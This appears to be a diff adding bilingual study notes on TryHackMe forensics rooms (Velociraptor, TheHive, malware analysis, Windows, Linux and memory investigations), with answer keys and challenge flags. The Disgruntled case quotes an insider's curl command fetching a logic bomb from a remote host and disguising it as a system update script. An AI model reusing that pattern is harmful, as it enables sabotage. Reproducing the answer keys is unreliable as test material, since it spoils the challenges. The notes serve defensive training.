@@ -1893,3 +1893,1272 @@ Memory forensics is SOC & DFIR essential skill
 ✔ RAM analysis reveals live attacker behavior
 ✔ Fileless malware detection সম্ভব
 ✔ Advanced threats disk tools এড়িয়ে যায়
+
+Day 9
+Velociraptor – Endpoint DFIR & Threat Hunting
+
+TryHackMe | Forensics Series | Day 9
+
+📌 Summary (Short Overview)
+
+Velociraptor একটি advanced open-source endpoint forensics & incident response platform, যা DFIR professionals দ্বারা তৈরি।
+এটি large-scale endpoint fleet-এ দ্রুত artifact collection, live response, threat hunting এবং detection করার জন্য ব্যবহৃত হয়।
+
+Developer: Mike Cohen
+
+Maintained by: Rapid7
+
+Core Strength: VQL (Velociraptor Query Language)
+
+Use Cases:
+
+Endpoint Forensics
+
+Live Response
+
+Threat Hunting
+
+Malware & Exploit Detection (PrintNightmare etc.)
+
+🎯 Learning Objectives
+
+এই room শেষ করার পর তুমি শিখবে:
+
+Velociraptor কী এবং কীভাবে কাজ করে
+
+Server ↔ Client architecture
+
+Client interrogation ও artifact collection
+
+Virtual File System (VFS)
+
+VQL basics (SELECT, FROM, WHERE)
+
+Artifact creation
+
+PrintNightmare vulnerability hunting
+
+🏗️ Velociraptor Architecture (Explanation)
+
+Velociraptor একটি single binary tool, যা ৩ভাবে কাজ করতে পারে:
+
+Server
+
+Client (Agent)
+
+Instant Velociraptor (Standalone GUI)
+
+🔹 Supported OS
+
+Windows
+
+Linux
+
+macOS
+
+🔹 Lab Setup (TryHackMe)
+
+Server: Ubuntu (WSL)
+
+Client: Windows
+
+Web UI: https://127.0.0.1:8889
+
+🔹 Instant Velociraptor Launch
+velociraptor.exe gui
+
+🖥️ Client Interaction & Investigation
+🔹 Client Identification
+
+Velociraptor hostname নয়, Client ID (C.xxxxx) দিয়ে endpoint track করে।
+
+Client metadata:
+
+Hostname
+
+OS & Architecture
+
+Agent Version
+
+Last Seen IP & Time
+
+Logged-in users
+
+🧠 Velociraptor UI Breakdown
+1️⃣ Overview
+
+System information
+
+OS, architecture, agent details
+
+2️⃣ VQL Drilldown
+
+CPU usage (Blue)
+
+Memory usage (Orange)
+
+Local users
+
+Domain information
+
+3️⃣ Shell (Live Response)
+
+Remote command execution:
+
+PowerShell
+
+CMD
+
+Bash
+
+VQL
+
+Example:
+
+whoami
+
+
+Output column:
+
+Stdout
+
+📦 Artifact Collection (Hands-on)
+Artifact Used
+Windows.KapeFiles.Targets
+
+Parameter Enabled
+
+✅ Ubuntu (WSL)
+
+📌 Purpose:
+Collect artifacts related to Ubuntu running inside Windows Subsystem for Linux
+
+Result
+
+Files collected: 19
+
+State change:
+
+⏳ Running → ✅ Completed
+
+📂 Virtual File System (VFS)
+
+VFS lets analysts remotely browse endpoint files.
+
+🔹 VFS Accessors
+Accessor	Description
+file	OS-level file access
+ntfs	Raw NTFS parsing (ADS, hidden files)
+registry	Windows Registry access
+artifacts	Previous collections
+🔹 Findings
+
+$Recycle.Bin → desktop.ini
+
+Hidden flag in Admin Documents:
+
+THM{VkVMT0NJUkFQVE9S}
+
+🧬 Velociraptor Query Language (VQL)
+🔹 VQL Structure
+SELECT <columns>
+FROM <plugin>
+WHERE <filter>
+
+Keyword	Meaning
+SELECT	Column selectors
+FROM	VQL plugin
+WHERE	Filter condition
+?	Autocomplete
+Example
+SELECT * FROM info()
+
+Run PowerShell via VQL
+execve()
+
+🧩 Artifacts (VQL Modules)
+
+Artifacts হলো:
+
+YAML-based mini programs
+
+Reusable VQL logic
+
+Shareable via Artifact Exchange
+
+👉 Analysts না বুঝলেও artifact run করতে পারে।
+
+🔎 NTFS & Forensic Plugins
+Purpose	Plugin
+Parse MFT	parse_mft
+Exclude directories	IsDir
+🚨 Threat Hunting – PrintNightmare
+Artifact Exchange Name
+Windows.Detection.PrintNightmare
+
+Custom VQL Query (Final)
+SELECT "C:/" + FullPath AS Full_Path,FileName AS File_Name,parse_pe(file="C:/" + FullPath) AS PE
+FROM parse_mft(filename="C:/$MFT", accessor="ntfs")
+WHERE NOT IsDir
+AND FullPath =~ "Windows/System32/spool/drivers"
+AND PE
+
+Findings
+
+Malicious DLL: nightmare.dll
+
+PDB Path:
+
+C:\Users\caleb\source\repos\nightmare\x64\Release\nightmare.pdb
+
+❓ Questions & Answers (TryHackMe)
+Question	Answer
+Instant Velociraptor command	velociraptor.exe gui
+Client hostname	THM-VELOCIRAPTOR.eu-west-1.compute.internal
+Agent version	2021-04-11T22:11:10Z
+NTFS hidden files accessor	ntfs accessor
+Registry accessor	registry accessor
+Hidden flag	THM{VkVMT0NJUkFQVE9S}
+PrintNightmare DLL	nightmare.dll
+🧠 Key Takeaways (Exam + Real-World)
+
+Velociraptor = Live DFIR at scale
+
+VQL gives SOC analysts SQL-like forensic power
+
+VFS enables remote file & registry access
+
+Artifacts simplify complex hunts
+
+Ideal tool for SOC, IR, Threat Hunting
+
+📁 Recommended GitHub Structure
+forensics/
+└── velociraptor/
+    └── day-09-velociraptor.md
+ 
+ day 10
+ 
+TheHive Project – Day 1
+Incident Response Case Management Fundamentals
+📘 Summary
+
+TheHive Project হলো একটি open-source Security Incident Response Platform (SIRP), যা SOC, CSIRT এবং DFIR টিমকে security incidents track, investigate এবং collaboratively manage করতে সাহায্য করে।
+
+এই দিনে আমরা শিখেছি:
+
+TheHive কী এবং SOC-এ এর ভূমিকা
+
+Core concepts: Case, Task, Observable, IOC
+
+User roles & permissions
+
+Analyst interface navigation
+
+Network traffic (PCAP) থেকে case তৈরি করা
+
+🎯 Learning Objectives
+
+Understand TheHive platform and workflow
+
+Learn collaborative incident response concepts
+
+Identify user roles and permissions
+
+Create an investigation case with:
+
+Severity, TLP, PAP
+
+Tasks
+
+MITRE ATT&CK TTPs
+
+Observables (IP, PCAP file)
+
+🧠 What is TheHive?
+
+TheHive একটি case-centric incident response platform।
+
+মূল ধারণা:
+
+প্রতিটি incident = Case
+
+Case → Tasks → Observables → IOCs
+
+Multiple analysts একই case-এ একসাথে কাজ করতে পারে
+
+Evidence, notes, tags, timeline সব এক জায়গায় থাকে
+
+👉 Velociraptor / KAPE / Volatility evidence সংগ্রহ করে
+👉 TheHive সেই evidence-কে investigation case হিসেবে manage করে
+
+🔑 Core Functions of TheHive
+🤝 Collaborate
+
+Multiple analysts একই case-এ কাজ করতে পারে
+
+Real-time updates (live activity stream)
+
+🧩 Elaborate
+
+Case ভেঙে Tasks তৈরি করা
+
+Evidence attach, notes যোগ করা
+
+MITRE ATT&CK mapping
+
+⚡ Act
+
+Observables যোগ করা
+
+IOC flag করা
+
+Cortex analyzers ও responders ব্যবহার (future stages)
+
+🧰 Features & Integrations
+Feature	Description
+Case & Task Management	Structured IR workflow
+Alert Triage	SIEM / Email / Feeds থেকে alert
+Observable Enrichment	Cortex integration
+Active Response	Responders
+Dashboards	Metrics & KPIs
+Threat Intelligence	MISP integration
+
+🔍 Observable analysis platform: Cortex
+
+👥 User Roles & Permissions
+Pre-Configured Roles
+Role	Capabilities
+admin	Platform admin, ❌ cannot manage cases
+org-admin	Full org & case control
+analyst	Create/edit cases, tasks, observables
+read-only	View only
+Important Permissions
+Permission	Function
+manageCase	Manage cases
+manageObservable	Create/update/delete observables
+manageTask	Manage tasks
+manageAnalyse	Run analyzers
+manageAction	Execute responders
+🧭 Analyst Interface Overview
+
+Dashboard: Active cases
+
+New Case creation
+
+Tasks & alerts overview
+
+Observables & evidence tracking
+
+🧪 Practical Investigation Scenario
+Scenario
+
+Suspicious FTP network traffic detected → possible data exfiltration
+
+Evidence:
+
+PCAP file (network capture)
+
+FTP connections from suspicious IP
+
+🗂️ Case Creation Workflow
+1️⃣ Create New Case
+
+Severity: Medium / High
+
+TLP: Amber
+
+PAP: Amber
+
+2️⃣ Add Tasks
+
+Analyze PCAP
+
+Identify source IP
+
+Check for data exfiltration
+
+Document findings
+
+3️⃣ MITRE ATT&CK Mapping
+
+Tactic: Exfiltration
+
+Technique: T1048.003
+(Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol)
+
+4️⃣ Add Observables
+
+IP Address (FTP source)
+
+PCAP file upload
+
+Mark IOC if malicious
+
+📌 Files (PCAP, logs, dumps) are also observables in TheHive
+
+🏁 Result
+
+Uploaded PCAP observable revealed the flag:
+
+THM{FILES_ARE_OBSERVABLES}
+
+❓ Question & Answer
+Question	Answer
+Observable analysis platform in TheHive?	Cortex
+Account that cannot manage cases?	admin
+Permission to manage observables?	manageObservable
+Permission to execute actions?	manageAction
+TTPs imported from?	MITRE ATT&CK
+Detection data source type?	Network Traffic
+Flag from PCAP observable?	THM{FILES_ARE_OBSERVABLES}
+🧠 Key Notes & Takeaways
+
+TheHive = Incident Response Brain
+
+Everything revolves around Cases
+
+Observables connect evidence → intelligence
+
+Files are first-class observables
+
+MITRE ATT&CK mapping adds threat context
+
+Ideal for SOC & DFIR collaboration
+
+📁 Recommended GitHub Structure
+forensics/
+└── thehive/
+    └── day-01-thehive-foundations.md
+
+day 11
+ Intro to Malware Analysis
+
+(TryHackMe – Fundamentals)
+
+📌 Summary
+
+এই রুমে malware analysis-এর foundation শেখানো হয়েছে। একজন SOC / DFIR analyst কীভাবে একটি suspicious file দেখে সিদ্ধান্ত নেবে সেটাই মূল লক্ষ্য।
+
+এখানে আমরা শিখেছি:
+
+Malware কী এবং কেন analysis দরকার
+
+Static vs Dynamic analysis
+
+PE file basics
+
+Hashing, strings, VirusTotal
+
+Sandbox behavior
+
+Anti-analysis techniques (packing, sandbox evasion)
+
+🎯 Learning Objectives
+
+Malware identify করা
+
+Initial verdict (malicious / benign) নেওয়া
+
+Safe analysis environment তৈরি
+
+Malware behavior বোঝা
+
+IOC extraction concept বোঝা
+
+🧠 What is Malware?
+
+Malware = Malicious Software
+
+যে software:
+
+Unauthorized কাজ করে
+
+Data চুরি / encrypt করে
+
+System control নেয়
+
+Persistence রাখে
+
+Detection evade করে
+
+সব malware একরকম না — behavior অনুযায়ী আলাদা category থাকে (ransomware, trojan, stealer ইত্যাদি)।
+
+👥 Who Performs Malware Analysis?
+Team	Purpose
+SOC	Detection rules লেখা
+Incident Response	Damage assess & clean-up
+Threat Hunting	IOC hunt
+Malware Researchers	AV / EDR signatures
+OS Vendors	Vulnerability analysis
+
+Correct Answer (THM):
+➡️ Threat Hunt Team
+
+⚠️ Malware Analysis Safety Rules
+
+Malware = Digital Weapon
+
+✔️ Dedicated isolated VM
+✔️ Snapshot before analysis
+✔️ Password-protected malware archive
+✔️ No shared folders
+✔️ No uncontrolled internet
+✔️ Revert VM after analysis
+
+❌ Never analyse malware on personal machine
+
+🔬 Malware Analysis Techniques
+1️⃣ Static Analysis
+
+(Without Executing Malware)
+
+File type
+
+Strings
+
+Hashes
+
+PE Header
+
+Imports / Sections
+
+✔️ Safe
+❌ Limited behavior visibility
+
+Correct Answer:
+➡️ Static Analysis
+
+2️⃣ Dynamic Analysis
+
+(Execute & Observe Behavior)
+
+Processes
+
+Registry changes
+
+Network traffic
+
+File system activity
+
+✔️ Real behavior
+❌ Risky if unsafe VM
+
+Correct Answer:
+➡️ Dynamic Analysis
+
+3️⃣ Advanced Analysis (Intro only)
+
+Disassembly
+
+Debugging
+
+Unpacking
+
+Memory forensics
+
+🧰 Tools Used
+Tool	Purpose
+file	Detect real file type
+strings	Extract readable strings
+md5sum / sha256sum	File identification
+pecheck	PE header & entropy
+pe-tree	GUI PE analysis
+VirusTotal	Reputation & AV verdict
+Hybrid Analysis	Sandbox behavior
+REMnux	Malware analysis OS
+📂 Static Analysis – Practical Findings
+🔹 File Type
+file wannacry
+
+
+➡️ PE32 Windows Executable (x86)
+
+🔹 Strings Analysis
+strings wannacry
+
+
+Found:
+
+Windows API calls
+
+Compression libraries
+
+Process & registry functions
+
+🔹 Hashing
+md5sum wannacry
+
+
+Purpose:
+
+Malware fingerprint
+
+Threat intel sharing
+
+VirusTotal lookup
+
+🔹 VirusTotal Result
+
+60+ AV detections
+
+Classified as WannaCry ransomware
+
+Behavior & relations available
+
+🧱 PE File Header Analysis
+Common Sections
+Section	Description
+.text	Executable code
+.data	Global variables
+.rdata	Read-only data
+.rsrc	Resources
+Imports Insight
+
+Example findings:
+
+RegOpenKeyExW → Registry access
+
+CreateServiceA → Persistence
+
+InternetOpen → Network communication
+
+🔄 Dynamic Analysis (Sandbox)
+
+Using Hybrid Analysis:
+
+Observed Behavior
+
+First process: setup_installer.exe
+
+Utilities used:
+
+cmd.exe
+
+powershell.exe
+
+Deletes backups & shadow copies
+
+Ransomware-like activity
+
+🛡️ Anti-Analysis Techniques
+🔹 Packing & Obfuscation
+
+High entropy sections
+
+Garbage strings
+
+No clear imports
+
+Correct Answer:
+➡️ Packing
+
+🔹 Sandbox Evasion
+
+Long sleep calls
+
+VM detection
+
+User activity checks
+
+Correct Answer:
+➡️ Long sleep calls
+
+❓ Question & Answers (Complete)
+Question	Answer
+IOC hunting team	Threat Hunt Team
+Analysis without execution	Static analysis
+Analysis with execution	Dynamic analysis
+MD5 of redline	ca2dc5a3f94c4f19334cc8b68f256259
+Creation time	2020-08-01 02:44:18 UTC
+.text entropy	6.453919
+Fifth section name	.ndata
+RegOpenKeyExW DLL	ADVAPI32.dll
+First process launched	setup_installer.exe
+Windows utilities used	cmd.exe, powershell.exe
+Static evasion technique	Packing
+Sandbox timeout technique	Long sleep calls
+🧠 Key Takeaways
+
+Always start with static analysis
+
+Hash = malware fingerprint
+
+PE imports tell behavior story
+
+Sandbox reveals true intent
+
+Malware actively avoids analysis
+
+Analyst thinking > tools
+
+📁 Suggested GitHub Structure
+forensics/
+└── malware-analysis/
+    └── intro-malware-analysis.md
+ day 12
+ Unattended
+
+Windows Forensic Investigation Case Study (TryHackMe)
+
+📌 Topic
+
+Unattended System Access & Data Exfiltration Investigation
+
+This case focuses on identifying unauthorized user activity on a Windows system during a specific unattended time window and determining whether sensitive data was accessed and exfiltrated.
+
+🧾 Summary Notes
+
+Unauthorized access occurred while the legitimate user was away
+
+Attacker used Windows Search artifacts to locate sensitive files
+
+Archive utility (7-Zip) was downloaded to bypass access limitations
+
+Sensitive content was staged locally
+
+Data was exfiltrated using Pastebin (cloud-based exfiltration)
+
+No USB devices were used (alternate exfiltration method)
+
+🎯 Case Scope
+Item	Details
+Date	19 November 2022
+Time Window	12:05 PM – 12:45 PM
+System Type	Windows
+Evidence Source	KAPE-collected disk artifacts
+Investigation Type	Post-Incident Forensics
+🧰 Tools Used
+
+Autopsy – Timeline & file activity analysis
+
+Registry Explorer – Search history & user actions
+
+KAPE Output – Pre-collected forensic artifacts
+
+Windows Explorer Artifacts – Search & file access evidence
+
+🔍 Detailed Explanation (Step-by-Step)
+1️⃣ Initial Access Confirmation
+
+Analysis of timeline artifacts confirmed user activity during the absence window, proving unauthorized access.
+
+2️⃣ Search Activity Analysis
+
+Windows Explorer search history showed intentional and targeted searching, not random browsing.
+
+File type searched: PDF
+
+Keyword searched: continental
+
+📌 This indicates prior knowledge of the file’s content.
+
+3️⃣ Tool Acquisition
+
+The attacker downloaded 7-Zip, a common archive utility, suggesting:
+
+The target file was compressed or protected
+
+The attacker needed extraction capability
+
+4️⃣ File Access
+
+After extraction, a PNG file containing sensitive data was accessed.
+
+This confirms:
+
+Archive was successfully opened
+
+Sensitive content was viewed
+
+5️⃣ Data Staging
+
+A text file was created and opened multiple times on the Desktop, indicating manual data preparation.
+
+6️⃣ Data Exfiltration
+
+Since USB devices were unavailable, the attacker used Pastebin, a public cloud service, to exfiltrate data.
+
+This is a common technique due to:
+
+Ease of access
+
+Low detection threshold
+
+No authentication requirement
+
+❓ Question & Answer (Evidence-Based)
+🔎 Task 3 – Snooping Around
+Question	Answer
+File type searched	.pdf
+Top-secret keyword searched	continental
+🔐 Task 4 – Can’t Simply Open It
+Question	Answer
+Downloaded file	7z2201-x64.exe
+Download time (UTC)	2022-11-19 12:09:19 UTC
+PNG file opened at	2022-11-19 12:10:21
+🌐 Task 5 – Sending It Outside
+Question	Answer
+Times text file opened	2
+Last modified time	11/19/2022 12:12
+Exfiltration URL	https://pastebin.com/1FQASAav
+Exfiltrated string	ne7AIRhi3PdESy9RnOrN
+🧠 Timeline Summary
+12:05  Legitimate user leaves
+12:09  7-Zip downloaded
+12:10  PNG file opened
+12:12  Text file modified
+12:xx  Data exfiltrated to Pastebin
+12:45  User returns
+
+🚩 Indicators of Compromise (IOCs)
+
+Search Keyword: continental
+
+File Type Targeted: PDF
+
+Tool Downloaded: 7z2201-x64.exe
+
+Exfiltration Platform: Pastebin
+
+Exfiltration URL: https://pastebin.com/1FQASAav
+
+⚖️ Final Conclusion
+
+✔️ Unauthorized access confirmed
+✔️ Sensitive data accessed
+✔️ Data exfiltrated externally
+✔️ Method used: Cloud-based exfiltration (Pastebin)
+
+🔴 This incident qualifies as a confirmed insider/physical access breach.
+
+📂 Suggested GitHub Structure
+forensics/
+├── notes/
+├── tools/
+├── cases/
+│   └── unattended.md
+
+day 13
+Disgruntled
+
+Linux Forensic Investigation – Logic Bomb Case
+
+📌 Topic
+
+Disgruntled Insider Investigation & Logic Bomb Detection
+
+This investigation focuses on identifying malicious insider activity performed by a disgruntled IT employee, including privilege abuse, unauthorized user creation, and deployment of a logic bomb on a Linux system.
+
+🧾 Case Summary
+
+An IT employee arrested for running a phishing operation was suspected of planting malicious persistence mechanisms on company assets. A forensic investigation was conducted to determine whether unauthorized actions were performed beyond the approved installation of a service.
+
+The investigation confirmed the presence of a logic bomb designed to trigger destructive behavior after a period of user inactivity.
+
+🎯 Case Scope
+Item	Details
+Platform	Linux
+Threat Type	Insider Threat
+Attack Type	Logic Bomb
+Investigation Focus	Privileged Commands & Audit Logs
+Evidence Source	System logs & shell history
+🧰 Tools & Artifacts Used
+
+Linux auth.log / sudo logs
+
+Command history
+
+Package manager logs (APT)
+
+File system metadata
+
+Script execution tracing
+
+🔍 Investigation Breakdown
+1️⃣ Initial Activity Review – Privileged Command Usage
+
+The suspect used elevated privileges to install a legitimate service, which initially appeared benign.
+
+Command Identified
+
+/usr/bin/apt install dokuwiki
+
+
+Working Directory
+
+/home/cybert
+
+
+📌 This aligns with the employee’s stated responsibility, but further actions raised concerns.
+
+2️⃣ Unauthorized User Creation
+
+After installing the package, a new user account was created without authorization.
+
+User Created
+
+it-admin
+
+
+This indicates persistence preparation or access delegation.
+
+3️⃣ Privilege Escalation
+
+The newly created user was granted sudo privileges, escalating the risk significantly.
+
+Sudoers File Modified
+
+Dec 28 06:27:34
+
+
+📌 Granting sudo access was not part of the approved task.
+
+4️⃣ Suspicious Script Editing
+
+A shell script was opened using vi, indicating manual modification.
+
+File Edited
+
+bomb.sh
+
+
+This was the first clear indicator of malicious intent.
+
+5️⃣ Script Origin & Obfuscation
+
+The original script was downloaded from a remote host, then renamed and relocated to disguise its purpose.
+
+Download Command
+
+curl 10.10.158.38:8080/bomb.sh --output bomb.sh
+
+
+New File Path
+
+/bin/os-update.sh
+
+
+Last Modified
+
+Dec 28 06:29
+
+
+📌 Renaming the file to resemble a system update script is a classic evasion technique.
+
+6️⃣ Payload & Impact
+
+The script was designed to execute a destructive payload.
+
+File Created Upon Execution
+
+goodbye.txt
+
+
+Further analysis revealed the script would:
+
+Check last user login time
+
+Trigger destructive actions if no login occurred in 30 days
+
+Delete service-related files
+
+This behavior confirms a logic bomb.
+
+❓ Question & Answer (Evidence-Based)
+🔎 Task 3 – Privileged Activity
+Question	Answer
+Installed package command	/usr/bin/apt install dokuwiki
+PWD during execution	/home/cybert
+🔐 Task 4 – Suspicious Actions
+Question	Answer
+User created	it-admin
+Sudoers updated	Dec 28 06:27:34
+File edited with vi	bomb.sh
+🧨 Task 5 – Logic Bomb Details
+Question	Answer
+Script creation command	curl 10.10.158.38:8080/bomb.sh --output bomb.sh
+Final file path	/bin/os-update.sh
+Last modified	Dec 28 06:29
+File created on execution	goodbye.txt
+🧠 Timeline Overview
+Dokuwiki installed (legitimate)
+↓
+Unauthorized user created
+↓
+Sudo privileges granted
+↓
+Malicious script downloaded
+↓
+Script renamed & hidden
+↓
+Logic bomb prepared
+
+🚩 Indicators of Compromise (IOCs)
+
+Malicious Script: /bin/os-update.sh
+
+Original Script Name: bomb.sh
+
+Remote Host: 10.10.158.38
+
+Unauthorized User: it-admin
+
+Attack Type: Logic Bomb
+
+⚖️ Final Conclusion
+
+✔️ Insider threat confirmed
+✔️ Unauthorized privilege escalation
+✔️ Malicious script planted
+✔️ Logic bomb intended for delayed destruction
+
+🔴 This incident represents a high-risk insider sabotage attempt.
+
+📂 Suggested GitHub Structure
+forensics/
+├── linux/
+│   └── disgruntled.md
+├── windows/
+├── memory/
+├── malware/
+
+day 14
+Memory Forensics Case – CRITICAL
+(Windows Memory Analysis with Volatility)
+📌 Case Overview (Scenario)
+
+User “Hattori” reported suspicious behavior on his Windows machine.
+Several PDF files were encrypted, including a critical company file:
+
+important_document.pdf
+
+Due to suspected credential theft and ransomware-like activity, the DFIR team captured a memory dump for investigation.
+
+🎯 Objective:
+Investigate the memory dump to identify:
+
+Suspicious processes
+
+Network activity
+
+Malicious binaries
+
+Evidence of encryption & key retrieval
+
+🎯 Learning Objectives
+
+Understand memory forensics fundamentals
+
+Analyze Windows RAM using Volatility 3
+
+Identify suspicious processes & network connections
+
+Extract forensic artifacts from memory
+
+Recover attacker infrastructure & encryption key evidence
+
+🧠 Memory Forensics – Key Concepts
+What is Memory Forensics?
+
+Memory forensics is the analysis of volatile memory (RAM) to identify:
+
+Running processes
+
+Network connections
+
+Decrypted malware payloads
+
+Execution artifacts not present on disk
+
+🧨 RAM is volatile → lost on shutdown/reboot, making it a priority evidence source.
+
+🧰 Tools & Environment
+Memory Acquisition Tools
+OS	Tool
+Windows	FTK Imager, WinPmem
+Linux	LIME
+macOS	osxpmem
+
+📌 In this case:
+
+Memory dump was acquired using FTK Imager
+
+File analyzed: memdump.mem
+
+Analysis Tool
+
+Volatility 3 (aliased as vol)
+
+🖥️ Environment Setup
+
+OS: Linux Analysis VM
+
+Memory dump location:
+
+/home/analyst/memdump.mem
+
+
+Volatility help:
+
+vol -h
+
+🔍 Phase 1: Target System Identification
+Plugin Used
+vol -f memdump.mem windows.info
+
+Findings
+Artifact	Value
+Architecture	x64
+Windows Version	Windows 10
+Kernel Base	0xf8066161b000
+Processors	2
+System Time	2024-02-24 22:52:52
+
+✔ Confirms correct target & context for analysis.
+
+🌐 Phase 2: Network Activity Analysis
+Plugin Used
+vol -f memdump.mem windows.netscan
+
+Suspicious Findings
+
+Port 3389 (RDP) activity
+
+Port 80 outbound connection
+
+Attribute	Value
+Destination IP	192.168.182.128
+Process	msedge.exe
+Timestamp	2024-02-24 22:47:52
+
+⚠️ Indicates possible attacker interaction or data exfiltration.
+
+🧬 Phase 3: Process Investigation
+Plugin Used
+vol -f memdump.mem windows.pstree
+
+Suspicious Processes Identified
+Process	PID	PPID
+critical_updat	❗	❗
+updater.exe	1612	critical_updat
+
+🚩 These processes are not legitimate Windows binaries
+🚩 Mimic legitimate naming → common attacker tactic
+
+Timestamp
+
+critical_updat started at:
+2024-02-24 22:51:50
+
+📂 Phase 4: File System Artifacts (From Memory)
+File Scan
+vol -f memdump.mem windows.filescan > filescan_out
+grep updater filescan_out
+
+
+📍 Malicious Binary Location
+
+C:\Users\user01\Documents\updater.exe
+C:\Users\user01\Documents\critical_update.exe
+
+MFT Analysis
+vol -f memdump.mem windows.mftscan.MFTScan > mftscan_out
+grep important_document.pdf mftscan_out
+
+
+📄 important_document.pdf
+
+Created: 2024-02-24 20:39:42
+
+🧠 Phase 5: Memory Dump of Malicious Process
+Dump Memory of updater.exe
+vol -f memdump.mem -o . windows.memmap --dump --pid 1612
+
+
+Generated file:
+
+pid.1612.dmp
+
+🔑 Phase 6: Extracting Encryption Evidence
+Strings Analysis
+strings pid.1612.dmp | less
+
+Critical Findings
+
+🔗 Key Retrieval URL
+
+http://key.critical-update.com/encKEY.txt
+
+
+📄 Targeted File
+
+important_document.pdf
+
+HTTP Request Analysis
+strings pid.1612.dmp | grep -B 10 -A 10 "http://key.critical-update.com/encKEY.txt"
+
+Attacker Infrastructure
+Artifact	Value
+Web Server	SimpleHTTP/0.6 Python/3.10.4
+Encryption Key	cafebabe
+
+🧨 Key was retrieved in-memory (never written to disk)
+
+❓ Question & Answer Summary
+Task-wise Answers
+Question	Answer
+Memory analyzed	RAM
+Dump phase	Memory Acquisition
+OS info plugin	windows.info
+Linux dump tool	LIME
+Volatility help	vol -h
+Architecture x64?	Y
+Windows version	10
+Kernel base	0xf8066161b000
+Port 80 destination IP	192.168.182.128
+Port 80 owner	msedge.exe
+Child PID of critical_updat	1612
+critical_updat timestamp	2024-02-24 22:51:50
+critical_updat path	C:\Users\user01\Documents\critical_update.exe
+important_document.pdf created	2024-02-24 20:39:42
+Attacker server	SimpleHTTP/0.6 Python/3.10.4
+🧾 Final Conclusion
+
+This investigation demonstrated how memory forensics alone can reveal:
+
+Active ransomware-like behavior
+
+Malicious processes disguised as system updates
+
+Network communication with attacker infrastructure
+
+Encryption keys retrieved directly from RAM
+
+Evidence unavailable through disk forensics
+
+🧠 Key takeaway:
+
+Memory forensics is critical for detecting fileless malware, in-memory keys, and live attacker activity.
+
+📚 Further Learning
+
+Windows Forensics 2
+
+Linux Forensics
+
+iOS Forensics
+
+Windows Applications Forensics
+
+Advanced Malware Analysis
+
+📂 Suggested GitHub Structure
+forensics/
+├── memory-forensics/
+│   ├── critical-case.md
+│   └── volatility-notes.md
+├── windows-forensics/
+├── malware-analysis/
+
+COMPLITE Digital Forensics and Incident Response(DFIR)
